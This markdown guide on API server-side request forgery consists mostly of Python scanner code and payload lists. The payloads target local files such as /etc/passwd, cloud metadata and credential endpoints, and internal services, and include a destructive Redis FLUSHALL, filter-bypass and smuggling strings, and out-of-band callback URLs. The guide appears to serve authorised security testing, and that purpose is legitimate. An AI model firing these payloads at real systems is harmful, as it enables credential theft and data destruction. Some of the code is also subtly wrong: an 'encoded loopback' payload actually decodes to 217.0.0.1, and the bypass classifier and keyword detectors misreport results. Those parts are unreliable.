# API | Server-Side Request Forgery (SSRF)

## 1.0 Comprehensive API Server-Side Request Forgery Testing

### 1.1 Understanding SSRF Attack Vectors

```yaml
API SSRF Attack Vectors:
  URL-Based SSRF:
    - Direct URL parameter manipulation
    - File upload URL fetching
    - Webhook callback exploitation
    - Image processing URL abuse
    
  Protocol-Based SSRF:
    - file:// protocol for local file access
    - gopher:// for internal service interaction
    - dict:// for port scanning
    - sftp:// for internal file access
    - ldap:// for directory service attacks
    
  Cloud Metadata SSRF:
    - AWS metadata service (169.254.169.254)
    - Google Cloud metadata (169.254.169.254)
    - Azure metadata service (169.254.169.254)
    - DigitalOcean metadata (169.254.169.254)
    - Kubernetes API server
    
  Internal Service SSRF:
    - Localhost service access (127.0.0.1, localhost)
    - Internal network scanning
    - Database access attempts
    - Cache server interaction
```

### 1.2 API SSRF Testing Methodology

```python
# API Server-Side Request Forgery Testing Framework
import requests
import json
import time
import socket
import ipaddress
from urllib.parse import urljoin, urlparse, quote
from concurrent.futures import ThreadPoolExecutor
import dns.resolver

class APISSRFTester:
    def __init__(self, target_url, callback_server=None):
        self.target_url = target_url
        self.callback_server = callback_server  # For blind SSRF detection
        self.vulnerabilities = []
        self.session = requests.Session()
        
    def test_basic_ssrf(self, endpoints_with_url_params):
        """Test basic SSRF vulnerabilities with URL parameters"""
        print("Testing basic SSRF vulnerabilities...")
        
        vulnerabilities = []
        
        # Common SSRF payloads
        ssrf_payloads = self.generate_ssrf_payloads()
        
        for endpoint_info in endpoints_with_url_params:
            endpoint = endpoint_info['endpoint']
            method = endpoint_info.get('method', 'GET')
            url_param = endpoint_info['url_param']
            
            for payload_category, payloads in ssrf_payloads.items():
                for payload in payloads:
                    try:
                        if method == 'GET':
                            params = {url_param: payload}
                            response = self.session.get(
                                f"{self.target_url}{endpoint}", 
                                params=params,
                                timeout=10
                            )
                        elif method == 'POST':
                            data = {url_param: payload}
                            response = self.session.post(
                                f"{self.target_url}{endpoint}", 
                                json=data,
                                timeout=10
                            )
                        
                        # Analyze response for SSRF indicators
                        analysis = self.analyze_ssrf_response(response, payload)
                        
                        if analysis['vulnerable']:
                            vulnerabilities.append({
                                'type': f'SSRF - {payload_category}',
                                'endpoint': endpoint,
                                'method': method,
                                'parameter': url_param,
                                'payload': payload,
                                'response_indicators': analysis['indicators'],
                                'severity': analysis['severity'],
                                'description': f'SSRF vulnerability with {payload_category} payload'
                            })
                            
                    except requests.exceptions.Timeout:
                        # Timeout might indicate successful internal request
                        vulnerabilities.append({
                            'type': f'SSRF - Timeout ({payload_category})',
                            'endpoint': endpoint,
                            'method': method,
                            'parameter': url_param,
                            'payload': payload,
                            'severity': 'Medium',
                            'description': f'Request timeout with {payload_category} payload (possible internal service)'
                        })
                    except Exception as e:
                        continue
        
        return vulnerabilities
    
    def test_protocol_handlers(self, endpoints):
        """Test various protocol handlers for SSRF"""
        print("Testing protocol handlers...")
        
        vulnerabilities = []
        
        protocol_payloads = {
            'file': [
                'file:///etc/passwd',
                'file:///c:/windows/system32/drivers/etc/hosts',
                'file:///etc/hosts'
            ],
            'gopher': [
                'gopher://127.0.0.1:22/',
                'gopher://localhost:25/',
                'gopher://internal.service:3306/'
            ],
            'dict': [
                'dict://127.0.0.1:22/',
                'dict://localhost:6379/',
                'dict://internal.redis:6379/'
            ],
            'sftp': [
                'sftp://example.com:22/',
                'sftp://127.0.0.1:22/etc/passwd'
            ],
            'ldap': [
                'ldap://localhost:389/',
                'ldap://127.0.0.1:389/cn=admin,dc=example,dc=com'
            ]
        }
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['endpoint']
            method = endpoint_info.get('method', 'GET')
            param_name = endpoint_info['param_name']
            
            for protocol, payloads in protocol_payloads.items():
                for payload in payloads:
                    try:
                        if method == 'GET':
                            params = {param_name: payload}
                            response = self.session.get(
                                f"{self.target_url}{endpoint}", 
                                params=params,
                                timeout=10
                            )
                        elif method == 'POST':
                            data = {param_name: payload}
                            response = self.session.post(
                                f"{self.target_url}{endpoint}", 
                                json=data,
                                timeout=10
                            )
                        
                        if response.status_code == 200:
                            # Check for protocol handler processing
                            if self.detect_protocol_handler_response(response, protocol):
                                vulnerabilities.append({
                                    'type': f'SSRF Protocol Handler - {protocol}',
                                    'endpoint': endpoint,
                                    'method': method,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'severity': 'High',
                                    'description': f'Successful {protocol} protocol handler usage'
                                })
                                
                    except Exception as e:
                        continue
        
        return vulnerabilities
    
    def test_cloud_metadata_ssrf(self, endpoints):
        """Test SSRF to cloud metadata services"""
        print("Testing cloud metadata SSRF...")
        
        vulnerabilities = []
        
        cloud_metadata_endpoints = [
            # AWS EC2
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
            
            # Google Cloud
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/computeMetadata/v1/',
            
            # Azure
            'http://169.254.169.254/metadata/instance',
            'http://169.254.169.254/metadata/attested/document',
            
            # DigitalOcean
            'http://169.254.169.254/metadata/v1/',
            
            # Kubernetes
            'https://kubernetes.default.svc/api/',
            'http://kubernetes.default.svc/api/'
        ]
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['endpoint']
            method = endpoint_info.get('method', 'GET')
            param_name = endpoint_info['param_name']
            
            for metadata_url in cloud_metadata_endpoints:
                try:
                    if method == 'GET':
                        params = {param_name: metadata_url}
                        response = self.session.get(
                            f"{self.target_url}{endpoint}", 
                            params=params,
                            timeout=10
                        )
                    elif method == 'POST':
                        data = {param_name: metadata_url}
                        response = self.session.post(
                            f"{self.target_url}{endpoint}", 
                            json=data,
                            timeout=10
                        )
                    
                    # Check for metadata in response
                    if self.detect_cloud_metadata(response):
                        vulnerabilities.append({
                            'type': 'Cloud Metadata SSRF',
                            'endpoint': endpoint,
                            'method': method,
                            'parameter': param_name,
                            'payload': metadata_url,
                            'severity': 'Critical',
                            'description': f'Access to cloud metadata: {metadata_url}'
                        })
                        
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def test_internal_service_ssrf(self, endpoints):
        """Test SSRF to internal services"""
        print("Testing internal service SSRF...")
        
        vulnerabilities = []
        
        internal_targets = [
            # Localhost services
            'http://localhost/',
            'http://127.0.0.1/',
            'http://0.0.0.0/',
            'http://127.1/',
            'http://127.0.1/',
            
            # Common internal services
            'http://localhost:22/',  # SSH
            'http://127.0.0.1:3306/',  # MySQL
            'http://localhost:5432/',  # PostgreSQL
            'http://127.0.0.1:6379/',  # Redis
            'http://localhost:27017/',  # MongoDB
            'http://127.0.0.1:9200/',  # Elasticsearch
            'http://localhost:5601/',  # Kibana
            'http://127.0.0.1:8080/',  # Internal web app
            'http://localhost:3000/',  # Development server
            
            # Internal network ranges
            'http://192.168.1.1/',
            'http://10.0.0.1/',
            'http://172.16.0.1/'
        ]
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['endpoint']
            method = endpoint_info.get('method', 'GET')
            param_name = endpoint_info['param_name']
            
            for internal_target in internal_targets:
                try:
                    if method == 'GET':
                        params = {param_name: internal_target}
                        response = self.session.get(
                            f"{self.target_url}{endpoint}", 
                            params=params,
                            timeout=10
                        )
                    elif method == 'POST':
                        data = {param_name: internal_target}
                        response = self.session.post(
                            f"{self.target_url}{endpoint}", 
                            json=data,
                            timeout=10
                        )
                    
                    # Analyze response for internal service indicators
                    analysis = self.analyze_internal_service_response(response, internal_target)
                    
                    if analysis['vulnerable']:
                        vulnerabilities.append({
                            'type': 'Internal Service SSRF',
                            'endpoint': endpoint,
                            'method': method,
                            'parameter': param_name,
                            'payload': internal_target,
                            'service_detected': analysis['service_type'],
                            'severity': 'High',
                            'description': f'Access to internal service: {internal_target}'
                        })
                        
                except requests.exceptions.Timeout:
                    # Timeout might indicate service is listening but not responding as expected
                    vulnerabilities.append({
                        'type': 'Internal Service SSRF - Timeout',
                        'endpoint': endpoint,
                        'method': method,
                        'parameter': param_name,
                        'payload': internal_target,
                        'severity': 'Medium',
                        'description': f'Timeout accessing internal service: {internal_target}'
                    })
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def test_blind_ssrf(self, endpoints):
        """Test blind SSRF using callback servers"""
        print("Testing blind SSRF...")
        
        if not self.callback_server:
            print("No callback server configured for blind SSRF testing")
            return []
        
        vulnerabilities = []
        
        # Generate unique callback URLs
        callback_urls = self.generate_callback_urls()
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['endpoint']
            method = endpoint_info.get('method', 'GET')
            param_name = endpoint_info['param_name']
            
            for callback_url in callback_urls:
                try:
                    if method == 'GET':
                        params = {param_name: callback_url}
                        response = self.session.get(
                            f"{self.target_url}{endpoint}", 
                            params=params,
                            timeout=10
                        )
                    elif method == 'POST':
                        data = {param_name: callback_url}
                        response = self.session.post(
                            f"{self.target_url}{endpoint}", 
                            json=data,
                            timeout=10
                        )
                    
                    # Check callback server for incoming requests
                    callback_detected = self.check_callback_server(callback_url)
                    
                    if callback_detected:
                        vulnerabilities.append({
                            'type': 'Blind SSRF',
                            'endpoint': endpoint,
                            'method': method,
                            'parameter': param_name,
                            'callback_url': callback_url,
                            'severity': 'High',
                            'description': f'Out-of-band request detected to {callback_url}'
                        })
                        
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def test_ssrf_filter_bypass(self, endpoints):
        """Test SSRF filter bypass techniques"""
        print("Testing SSRF filter bypasses...")
        
        vulnerabilities = []
        
        bypass_payloads = [
            # URL encoding
            'http://127.0.0.1',
            'http://%32%31%37%2E%30%2E%30%2E%31',
            'http://0x7f000001',
            'http://2130706433',
            'http://0177.0.0.1',
            
            # Domain bypass
            'http://localhost.localdomain',
            'http://localhost.@evil.com',
            'http://127.0.0.1.nip.io',
            'http://localtest.me',
            
            # IPv6
            'http://[::1]/',
            'http://[::ffff:127.0.0.1]/',
            
            # Mixed case
            'http://LOCALHOST',
            'http://LoCaLhOsT',
            
            # URL parser confusion
            'http://127.1/',
            'http://127.0.1/',
            'http://0/',
            
            # DNS rebinding
            f'http://{self.generate_dns_rebinding_url()}'
        ]
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['endpoint']
            method = endpoint_info.get('method', 'GET')
            param_name = endpoint_info['param_name']
            
            for bypass_payload in bypass_payloads:
                try:
                    if method == 'GET':
                        params = {param_name: bypass_payload}
                        response = self.session.get(
                            f"{self.target_url}{endpoint}", 
                            params=params,
                            timeout=10
                        )
                    elif method == 'POST':
                        data = {param_name: bypass_payload}
                        response = self.session.post(
                            f"{self.target_url}{endpoint}", 
                            json=data,
                            timeout=10
                        )
                    
                    analysis = self.analyze_ssrf_response(response, bypass_payload)
                    
                    if analysis['vulnerable']:
                        vulnerabilities.append({
                            'type': 'SSRF Filter Bypass',
                            'endpoint': endpoint,
                            'method': method,
                            'parameter': param_name,
                            'payload': bypass_payload,
                            'technique': self.get_bypass_technique(bypass_payload),
                            'severity': 'High',
                            'description': f'SSRF filter bypass using {self.get_bypass_technique(bypass_payload)}'
                        })
                        
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def generate_ssrf_payloads(self):
        """Generate comprehensive SSRF test payloads"""
        payloads = {
            'localhost': [
                'http://localhost',
                'http://127.0.0.1',
                'http://0.0.0.0',
                'http://[::1]'
            ],
            'internal_network': [
                'http://192.168.1.1',
                'http://10.0.0.1',
                'http://172.16.0.1',
                'http://internal.service'
            ],
            'cloud_metadata': [
                'http://169.254.169.254',
                'http://metadata.google.internal',
                'http://169.254.169.254/metadata/instance'
            ],
            'file_protocol': [
                'file:///etc/passwd',
                'file:///c:/windows/system32/drivers/etc/hosts'
            ],
            'service_protocols': [
                'gopher://127.0.0.1:22',
                'dict://localhost:6379',
                'sftp://example.com:22'
            ]
        }
        return payloads
    
    def analyze_ssrf_response(self, response, payload):
        """Analyze response for SSRF indicators"""
        analysis = {
            'vulnerable': False,
            'indicators': [],
            'severity': 'Low'
        }
        
        response_text = response.text.lower()
        response_headers = str(response.headers).lower()
        
        # Check for local file contents
        local_file_indicators = [
            'root:', 'daemon:', 'bin:', 'sys:', 'mysql:',
            'localhost', '127.0.0.1', 'windows system32'
        ]
        
        for indicator in local_file_indicators:
            if indicator in response_text:
                analysis['indicators'].append(f'Local file content: {indicator}')
                analysis['vulnerable'] = True
                analysis['severity'] = 'High'
        
        # Check for cloud metadata
        cloud_indicators = [
            'instance-id', 'ami-id', 'hostname', 'public-keys',
            'google-compute-engine', 'azure', 'aws'
        ]
        
        for indicator in cloud_indicators:
            if indicator in response_text:
                analysis['indicators'].append(f'Cloud metadata: {indicator}')
                analysis['vulnerable'] = True
                analysis['severity'] = 'Critical'
        
        # Check for service banners
        service_banners = [
            'ssh', 'mysql', 'redis', 'postgresql', 'elasticsearch',
            'apache', 'nginx', 'iis'
        ]
        
        for banner in service_banners:
            if banner in response_text:
                analysis['indicators'].append(f'Service banner: {banner}')
                analysis['vulnerable'] = True
                analysis['severity'] = 'High'
        
        # Check for error messages that reveal internal information
        error_indicators = [
            'connection refused', 'connection timeout', 'no route to host',
            'internal server error', 'forbidden'
        ]
        
        for indicator in error_indicators:
            if indicator in response_text:
                analysis['indicators'].append(f'Error message: {indicator}')
                # These might indicate attempted internal access
        
        return analysis
    
    def detect_protocol_handler_response(self, response, protocol):
        """Detect successful protocol handler usage"""
        if protocol == 'file':
            # Check for file contents
            file_indicators = ['root:', 'bin:', 'windows', 'system32']
            return any(indicator in response.text.lower() for indicator in file_indicators)
        
        elif protocol in ['gopher', 'dict']:
            # Check for service responses or errors
            return 'connection' in response.text.lower() or 'refused' in response.text.lower()
        
        return False
    
    def detect_cloud_metadata(self, response):
        """Detect cloud metadata in response"""
        metadata_indicators = [
            'instance-id', 'ami-id', 'region', 'availability-zone',
            'google-compute-engine', 'microsoft azure', 'aws'
        ]
        
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in metadata_indicators)
    
    def analyze_internal_service_response(self, response, target):
        """Analyze response for internal service access"""
        analysis = {
            'vulnerable': False,
            'service_type': 'Unknown'
        }
        
        response_text = response.text.lower()
        
        # Service-specific detection
        service_indicators = {
            'ssh': ['ssh', 'protocol', 'refused'],
            'mysql': ['mysql', 'mariadb', 'access denied'],
            'redis': ['redis', '-err', '+ok'],
            'postgresql': ['postgresql', 'psql', 'password authentication failed'],
            'elasticsearch': ['elasticsearch', 'cluster_name', 'lucene_version'],
            'web_server': ['apache', 'nginx', 'iis', 'server:', 'http/']
        }
        
        for service, indicators in service_indicators.items():
            if any(indicator in response_text for indicator in indicators):
                analysis['vulnerable'] = True
                analysis['service_type'] = service
                break
        
        return analysis
    
    def generate_callback_urls(self):
        """Generate callback URLs for blind SSRF testing"""
        if not self.callback_server:
            return []
        
        unique_id = str(int(time.time()))
        callback_urls = [
            f'http://{self.callback_server}/callback/{unique_id}',
            f'http://{self.callback_server}:8080/test/{unique_id}',
            f'https://{self.callback_server}/ssrf/{unique_id}'
        ]
        
        return callback_urls
    
    def check_callback_server(self, callback_url):
        """Check callback server for incoming requests"""
        # This would typically query your callback server (Burp Collaborator, webhook.site, etc.)
        # For demonstration, we'll simulate this
        print(f"Checking callback server for: {callback_url}")
        # In real testing, you would query your callback service API
        return False  # Simulated result
    
    def generate_dns_rebinding_url(self):
        """Generate DNS rebinding test URL"""
        # This would point to a service that rotates IPs
        return "rebind.example.com"
    
    def get_bypass_technique(self, payload):
        """Identify the bypass technique used in payload"""
        if '%.' in payload:
            return 'URL Encoding'
        elif '0x' in payload:
            return 'Hexadecimal IP'
        elif payload.replace('.', '').isdigit() and int(payload.replace('.', '')) > 1000000:
            return 'Decimal IP'
        elif '::' in payload:
            return 'IPv6'
        elif payload.upper() != payload.lower() and any(c.isupper() for c in payload):
            return 'Mixed Case'
        elif 'nip.io' in payload or 'localtest.me' in payload:
            return 'DNS Rebinding'
        else:
            return 'Unknown Bypass'
    
    def comprehensive_ssrf_testing(self, test_scenarios):
        """Perform comprehensive SSRF testing"""
        print("Starting comprehensive API SSRF testing...")
        
        all_vulnerabilities = []
        
        # Basic SSRF Testing
        if test_scenarios.get('basic_ssrf'):
            basic_vulns = self.test_basic_ssrf(test_scenarios['basic_ssrf'])
            all_vulnerabilities.extend(basic_vulns)
        
        # Protocol Handler Testing
        if test_scenarios.get('protocol_handlers'):
            protocol_vulns = self.test_protocol_handlers(test_scenarios['protocol_handlers'])
            all_vulnerabilities.extend(protocol_vulns)
        
        # Cloud Metadata Testing
        if test_scenarios.get('cloud_metadata'):
            cloud_vulns = self.test_cloud_metadata_ssrf(test_scenarios['cloud_metadata'])
            all_vulnerabilities.extend(cloud_vulns)
        
        # Internal Service Testing
        if test_scenarios.get('internal_services'):
            internal_vulns = self.test_internal_service_ssrf(test_scenarios['internal_services'])
            all_vulnerabilities.extend(internal_vulns)
        
        # Blind SSRF Testing
        if test_scenarios.get('blind_ssrf'):
            blind_vulns = self.test_blind_ssrf(test_scenarios['blind_ssrf'])
            all_vulnerabilities.extend(blind_vulns)
        
        # Filter Bypass Testing
        if test_scenarios.get('filter_bypass'):
            bypass_vulns = self.test_ssrf_filter_bypass(test_scenarios['filter_bypass'])
            all_vulnerabilities.extend(bypass_vulns)
        
        return all_vulnerabilities

# Usage Example
tester = APISSRFTester('https://api.example.com', 'webhook.catch.com')

test_scenarios = {
    'basic_ssrf': [
        {
            'endpoint': '/api/fetch',
            'method': 'GET',
            'url_param': 'url'
        },
        {
            'endpoint': '/api/process',
            'method': 'POST',
            'url_param': 'image_url'
        }
    ],
    'protocol_handlers': [
        {
            'endpoint': '/api/download',
            'method': 'GET',
            'param_name': 'file'
        }
    ],
    'cloud_metadata': [
        {
            'endpoint': '/api/metadata',
            'method': 'GET',
            'param_name': 'endpoint'
        }
    ],
    'internal_services': [
        {
            'endpoint': '/api/proxy',
            'method': 'GET',
            'param_name': 'target'
        }
    ],
    'blind_ssrf': [
        {
            'endpoint': '/api/webhook',
            'method': 'POST',
            'param_name': 'callback_url'
        }
    ],
    'filter_bypass': [
        {
            'endpoint': '/api/fetch',
            'method': 'GET',
            'param_name': 'url'
        }
    ]
}

vulnerabilities = tester.comprehensive_ssrf_testing(test_scenarios)
```

## 2.0 Advanced SSRF Attack Techniques

### 2.1 DNS Rebinding Attacks

```python
# DNS Rebinding SSRF Testing
class DNSRebindingTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerabilities = []
        self.session = requests.Session()
    
    def test_dns_rebinding(self, endpoints, rebinding_domains):
        """Test DNS rebinding attacks for SSRF"""
        print("Testing DNS rebinding attacks...")
        
        vulnerabilities = []
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['endpoint']
            method = endpoint_info.get('method', 'GET')
            param_name = endpoint_info['param_name']
            
            for domain in rebinding_domains:
                payload = f'http://{domain}/'
                
                try:
                    if method == 'GET':
                        params = {param_name: payload}
                        response = self.session.get(
                            f"{self.target_url}{endpoint}", 
                            params=params,
                            timeout=10
                        )
                    elif method == 'POST':
                        data = {param_name: payload}
                        response = self.session.post(
                            f"{self.target_url}{endpoint}", 
                            json=data,
                            timeout=10
                        )
                    
                    # Analyze response timing and content
                    if self.detect_rebinding_behavior(response, domain):
                        vulnerabilities.append({
                            'type': 'DNS Rebinding SSRF',
                            'endpoint': endpoint,
                            'method': method,
                            'parameter': param_name,
                            'rebinding_domain': domain,
                            'severity': 'High',
                            'description': f'Potential DNS rebinding vulnerability with {domain}'
                        })
                        
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def detect_rebinding_behavior(self, response, domain):
        """Detect DNS rebinding behavior"""
        # Look for signs of internal service access after DNS change
        internal_indicators = [
            'localhost', '127.0.0.1', 'internal', '192.168', '10.0'
        ]
        
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in internal_indicators)

# DNS Rebinding Test Example
rebinding_tester = DNSRebindingTester('https://api.example.com')
rebinding_domains = [
    'rbndr.us', 
    'sslip.io',
    'nip.io',
    'localtest.me'
]

rebinding_endpoints = [
    {
        'endpoint': '/api/fetch',
        'method': 'GET',
        'param_name': 'url'
    }
]

rebinding_vulns = rebinding_tester.test_dns_rebinding(rebinding_endpoints, rebinding_domains)
```

### 2.2 Advanced Protocol Attacks

```python
# Advanced Protocol SSRF Testing
class AdvancedProtocolTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerabilities = []
        self.session = requests.Session()
    
    def test_redis_ssrf(self, endpoints):
        """Test SSRF to Redis services"""
        print("Testing Redis SSRF...")
        
        vulnerabilities = []
        
        # Redis protocol payloads
        redis_payloads = [
            # Basic Redis connection
            'dict://127.0.0.1:6379/',
            'gopher://127.0.0.1:6379/_INFO',
            
            # Redis command injection
            'gopher://127.0.0.1:6379/_SET%20key%20value',
            'gopher://127.0.0.1:6379/_FLUSHALL',
            
            # Redis authentication bypass
            'gopher://127.0.0.1:6379/_AUTH%20password',
        ]
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['endpoint']
            method = endpoint_info.get('method', 'GET')
            param_name = endpoint_info['param_name']
            
            for payload in redis_payloads:
                try:
                    if method == 'GET':
                        params = {param_name: payload}
                        response = self.session.get(
                            f"{self.target_url}{endpoint}", 
                            params=params,
                            timeout=10
                        )
                    elif method == 'POST':
                        data = {param_name: payload}
                        response = self.session.post(
                            f"{self.target_url}{endpoint}", 
                            json=data,
                            timeout=10
                        )
                    
                    if self.detect_redis_response(response):
                        vulnerabilities.append({
                            'type': 'Redis SSRF',
                            'endpoint': endpoint,
                            'method': method,
                            'parameter': param_name,
                            'payload': payload,
                            'severity': 'Critical',
                            'description': 'SSRF to Redis service detected'
                        })
                        
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def test_mysql_ssrf(self, endpoints):
        """Test SSRF to MySQL services"""
        print("Testing MySQL SSRF...")
        
        vulnerabilities = []
        
        mysql_payloads = [
            'gopher://127.0.0.1:3306/',
            'dict://127.0.0.1:3306/',
        ]
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['endpoint']
            method = endpoint_info.get('method', 'GET')
            param_name = endpoint_info['param_name']
            
            for payload in mysql_payloads:
                try:
                    if method == 'GET':
                        params = {param_name: payload}
                        response = self.session.get(
                            f"{self.target_url}{endpoint}", 
                            params=params,
                            timeout=10
                        )
                    elif method == 'POST':
                        data = {param_name: payload}
                        response = self.session.post(
                            f"{self.target_url}{endpoint}", 
                            json=data,
                            timeout=10
                        )
                    
                    if self.detect_mysql_response(response):
                        vulnerabilities.append({
                            'type': 'MySQL SSRF',
                            'endpoint': endpoint,
                            'method': method,
                            'parameter': param_name,
                            'payload': payload,
                            'severity': 'Critical',
                            'description': 'SSRF to MySQL service detected'
                        })
                        
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def test_http_smuggling_ssrf(self, endpoints):
        """Test HTTP request smuggling via SSRF"""
        print("Testing HTTP request smuggling SSRF...")
        
        vulnerabilities = []
        
        smuggling_payloads = [
            # CL.TE smuggling
            'http://127.0.0.1:80/\r\nTransfer-Encoding: chunked\r\n0\r\n\r\nGET /admin HTTP/1.1',
            
            # TE.CL smuggling  
            'http://127.0.0.1:80/ HTTP/1.1\r\nTransfer-Encoding: chunked\r\n0\r\n\r\n'
        ]
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['endpoint']
            method = endpoint_info.get('method', 'GET')
            param_name = endpoint_info['param_name']
            
            for payload in smuggling_payloads:
                try:
                    # URL encode the payload
                    encoded_payload = quote(payload, safe='')
                    
                    if method == 'GET':
                        params = {param_name: encoded_payload}
                        response = self.session.get(
                            f"{self.target_url}{endpoint}", 
                            params=params,
                            timeout=10
                        )
                    elif method == 'POST':
                        data = {param_name: encoded_payload}
                        response = self.session.post(
                            f"{self.target_url}{endpoint}", 
                            json=data,
                            timeout=10
                        )
                    
                    # Check for smuggling indicators
                    if self.detect_smuggling_success(response):
                        vulnerabilities.append({
                            'type': 'HTTP Smuggling SSRF',
                            'endpoint': endpoint,
                            'method': method,
                            'parameter': param_name,
                            'payload': payload,
                            'severity': 'High',
                            'description': 'HTTP request smuggling via SSRF detected'
                        })
                        
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def detect_redis_response(self, response):
        """Detect Redis service response"""
        redis_indicators = [
            'redis', 'redis_version', 'connected_clients', 'used_memory'
        ]
        return any(indicator in response.text.lower() for indicator in redis_indicators)
    
    def detect_mysql_response(self, response):
        """Detect MySQL service response"""
        mysql_indicators = [
            'mysql', 'mariadb', 'access denied', 'native password'
        ]
        return any(indicator in response.text.lower() for indicator in mysql_indicators)
    
    def detect_smuggling_success(self, response):
        """Detect successful HTTP request smuggling"""
        # This would require monitoring the target service for the smuggled request
        # For testing, we might look for specific error messages or behavior
        return False

# Advanced Protocol Testing Example
advanced_tester = AdvancedProtocolTester('https://api.example.com')

protocol_endpoints = [
    {
        'endpoint': '/api/proxy',
        'method': 'GET',
        'param_name': 'target'
    }
]

redis_vulns = advanced_tester.test_redis_ssrf(protocol_endpoints)
mysql_vulns = advanced_tester.test_mysql_ssrf(protocol_endpoints)
smuggling_vulns = advanced_tester.test_http_smuggling_ssrf(protocol_endpoints)
```

## 3.0 Automated SSRF Testing Framework

### 3.1 Comprehensive Testing Suite

```python
# API SSRF Security Scanner
class APISSRFScanner:
    def __init__(self, base_url, config):
        self.base_url = base_url
        self.config = config
        self.results = {
            'critical': [],
            'high': [],
            'medium': [],
            'low': [],
            'info': []
        }
        
    def run_comprehensive_scan(self, endpoints_config, callback_server=None):
        """Run comprehensive SSRF security scan"""
        print("Starting API SSRF Security Scan...")
        
        # Initialize tester
        tester = APISSRFTester(self.base_url, callback_server)
        
        scan_tests = [
            (self.scan_basic_ssrf, endpoints_config.get('basic_endpoints', [])),
            (self.scan_protocol_handlers, endpoints_config.get('protocol_endpoints', [])),
            (self.scan_cloud_metadata, endpoints_config.get('metadata_endpoints', [])),
            (self.scan_internal_services, endpoints_config.get('internal_endpoints', [])),
            (self.scan_blind_ssrf, endpoints_config.get('blind_endpoints', [])),
            (self.scan_filter_bypass, endpoints_config.get('bypass_endpoints', []))
        ]
        
        for scan_method, endpoints in scan_tests:
            if endpoints:
                try:
                    vulnerabilities = scan_method(tester, endpoints)
                    self.categorize_vulnerabilities(vulnerabilities)
                except Exception as e:
                    print(f"Error in {scan_method.__name__}: {e}")
        
        return self.generate_report()
    
    def scan_basic_ssrf(self, tester, endpoints):
        """Scan for basic SSRF vulnerabilities"""
        return tester.test_basic_ssrf(endpoints)
    
    def scan_protocol_handlers(self, tester, endpoints):
        """Scan for protocol handler SSRF"""
        return tester.test_protocol_handlers(endpoints)
    
    def scan_cloud_metadata(self, tester, endpoints):
        """Scan for cloud metadata SSRF"""
        return tester.test_cloud_metadata_ssrf(endpoints)
    
    def scan_internal_services(self, tester, endpoints):
        """Scan for internal service SSRF"""
        return tester.test_internal_service_ssrf(endpoints)
    
    def scan_blind_ssrf(self, tester, endpoints):
        """Scan for blind SSRF"""
        return tester.test_blind_ssrf(endpoints)
    
    def scan_filter_bypass(self, tester, endpoints):
        """Scan for SSRF filter bypass"""
        return tester.test_ssrf_filter_bypass(endpoints)
    
    def categorize_vulnerabilities(self, vulnerabilities):
        """Categorize vulnerabilities by severity"""
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'info').lower()
            self.results[severity].append(vuln)
    
    def generate_report(self):
        """Generate comprehensive security report"""
        report = {
            'scan_summary': {
                'total_vulnerabilities': sum(len(vulns) for vulns in self.results.values()),
                'critical_count': len(self.results['critical']),
                'high_count': len(self.results['high']),
                'medium_count': len(self.results['medium']),
                'low_count': len(self.results['low']),
                'info_count': len(self.results['info'])
            },
            'vulnerabilities': self.results,
            'recommendations': self.generate_recommendations(),
            'risk_score': self.calculate_risk_score()
        }
        
        return report
    
    def generate_recommendations(self):
        """Generate security recommendations based on findings"""
        recommendations = []
        
        if self.results['critical'] or self.results['high']:
            recommendations.extend([
                "Implement strict URL validation and allowlisting",
                "Block access to internal IP ranges and localhost",
                "Disable dangerous protocol handlers (file://, gopher://, dict://)",
                "Implement network-level restrictions for outbound requests",
                "Use authentication for internal services"
            ])
        
        if self.results['medium']:
            recommendations.extend([
                "Implement SSRF protection middleware",
                "Use DNS resolution filtering",
                "Add request timeout limits",
                "Implement content-type validation",
                "Add security headers to prevent information disclosure"
            ])
        
        return recommendations
    
    def calculate_risk_score(self):
        """Calculate overall risk score"""
        weights = {'critical': 5, 'high': 4, 'medium': 3, 'low': 2, 'info': 1}
        
        total_weight = 0
        for severity, vulns in self.results.items():
            total_weight += len(vulns) * weights.get(severity, 0)
        
        # Normalize score to 0-10
        max_possible_weight = sum(len(vulns) for vulns in self.results.values()) * 5
        risk_score = (total_weight / max_possible_weight * 10) if max_possible_weight > 0 else 0
        
        return min(risk_score, 10)

# Usage Example
scanner_config = {
    'timeout': 30,
    'max_workers': 10
}

scanner = APISSRFScanner('https://api.example.com', scanner_config)

endpoints_config = {
    'basic_endpoints': [
        {
            'endpoint': '/api/fetch',
            'method': 'GET',
            'url_param': 'url'
        }
    ],
    'protocol_endpoints': [
        {
            'endpoint': '/api/download',
            'method': 'GET',
            'param_name': 'file'
        }
    ],
    'metadata_endpoints': [
        {
            'endpoint': '/api/cloud',
            'method': 'GET',
            'param_name': 'endpoint'
        }
    ],
    'internal_endpoints': [
        {
            'endpoint': '/api/proxy',
            'method': 'GET',
            'param_name': 'target'
        }
    ],
    'blind_endpoints': [
        {
            'endpoint': '/api/webhook',
            'method': 'POST',
            'param_name': 'callback_url'
        }
    ],
    'bypass_endpoints': [
        {
            'endpoint': '/api/fetch',
            'method': 'GET',
            'param_name': 'url'
        }
    ]
}

report = scanner.run_comprehensive_scan(endpoints_config, 'webhook.catch.com')

print(f"Scan completed. Risk Score: {report['risk_score']:.1f}/10")
